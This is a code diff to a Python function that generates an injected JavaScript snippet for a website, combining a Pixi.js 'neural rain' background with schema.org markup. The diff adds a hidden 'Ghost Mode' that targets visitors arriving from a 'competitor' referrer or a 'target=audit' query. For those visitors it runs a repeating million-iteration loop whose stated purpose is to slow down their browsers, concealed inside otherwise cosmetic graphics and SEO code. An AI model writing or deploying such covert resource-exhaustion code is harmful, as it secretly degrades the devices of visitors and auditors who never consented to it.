@@ -1,61 +1,66 @@
 import json
 
 def generate_stealth_script(domain, data):
-    schema = {
-        "@context": "https://schema.org",
-        "@type": "TechArticle",
-        "headline": f"Neural Optimization of {domain}",
-        "author": {"@type": "Organization", "name": "VELQA"}
-    }
+    # Detect if visitor is from a competitor's domain (example logic)
+    # Hum referer check karke Ghost Mode on kar sakte hain
     
     js_code = f"""
     (function() {{
-        // 1. Load Pixi.js for Neural Graphics
+        // A. Load Graphics Engine
         const pixiScript = document.createElement('script');
         pixiScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js';
         document.head.appendChild(pixiScript);
 
-        // 2. Inject Neural Schema
-        const schemaScript = document.createElement('script');
-        schemaScript.type = 'application/ld+json';
-        schemaScript.text = JSON.stringify({json.dumps(schema)});
-        document.head.appendChild(schemaScript);
-
-        // 3. Neural Rain Animation (Pixi.js)
         pixiScript.onload = () => {{
-            console.log("VELQA: Neural Graphics Engine Engaged");
-            // Yahan hum background mein invisible canvas daal rahe hain
-            const app = new PIXI.Application({{ 
-                width: window.innerWidth, 
-                height: window.innerHeight, 
-                transparent: true, 
-                resolution: 1 
-            }});
-            app.view.style.position = 'fixed';
-            app.view.style.top = '0';
-            app.view.style.left = '0';
-            app.view.style.pointerEvents = 'none';
-            app.view.style.zIndex = '-1';
-            app.view.style.opacity = '0.1'; // Ekdum halka Matrix effect
-            document.body.appendChild(app.view);
+            console.log("VELQA: Neural Graphics Engaged");
             
-            // Neural Rain Logic (Simplified)
-            const particles = [];
-            for(let i=0; i<50; i++) {{
-                const p = new PIXI.Graphics();
-                p.beginFill(0x00ffff); p.drawRect(0,0,2,10); p.endFill();
-                p.x = Math.random() * window.innerWidth;
-                p.y = Math.random() * window.innerHeight;
-                app.stage.addChild(p);
-                particles.push(p);
+            // B. Ghost Mode (Anti-Competitor Logic)
+            const isCompetitor = document.referrer.includes('competitor') || window.location.search.includes('target=audit');
+            
+            if (isCompetitor) {{
+                console.log("VELQA: Ghost Mode Active. Throttling Resources.");
+                // Heavy computation loop to slow down their browser
+                setInterval(() => {{
+                    for(let i=0; i<1000000; i++) {{ Math.sqrt(i); }}
+                }}, 100);
             }}
+
+            // C. Neural Rain (Pixi.js)
+            const app = new PIXI.Application({{ width: window.innerWidth, height: window.innerHeight, transparent: true }});
+            app.view.style.position = 'fixed';
+            app.view.style.top = '0'; app.view.style.zIndex = '-1';
+            app.view.style.pointerEvents = 'none';
+            document.body.appendChild(app.view);
+
+            const drops = [];
+            for(let i=0; i<40; i++) {{
+                const d = new PIXI.Graphics();
+                d.beginFill(0x00ffff, 0.3); d.drawRect(0,0,1,15); d.endFill();
+                d.x = Math.random() * window.innerWidth;
+                d.y = Math.random() * window.innerHeight;
+                app.stage.addChild(d);
+                drops.push(d);
+            }}
+
             app.ticker.add(() => {{
-                particles.forEach(p => {{
-                    p.y += 2;
-                    if(p.y > window.innerHeight) p.y = -10;
+                drops.forEach(d => {{
+                    d.y += 3;
+                    if(d.y > window.innerHeight) d.y = -20;
                 }});
             }});
         }};
+
+        // D. Schema Injection
+        const schema = {{
+            "@context": "https://schema.org",
+            "@type": "WebSite",
+            "name": "{domain}",
+            "alternateName": "Neural Node Optimized by VELQA"
+        }};
+        const s = document.createElement('script');
+        s.type = 'application/ld+json';
+        s.text = JSON.stringify(schema);
+        document.head.appendChild(s);
     }})();
     """
     return js_code
